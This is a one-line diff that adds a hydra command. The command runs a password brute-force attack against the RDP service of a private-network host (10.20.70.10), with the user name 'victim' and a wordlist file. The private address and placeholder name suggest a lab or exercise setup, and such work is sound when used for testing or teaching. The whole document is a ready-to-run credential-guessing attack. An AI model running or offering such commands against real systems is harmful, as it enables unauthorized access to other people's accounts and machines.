@@ -1,0 +1,1 @@
+hydra -l victim -P pw-five.txt -t 1 rdp://10.20.70.10
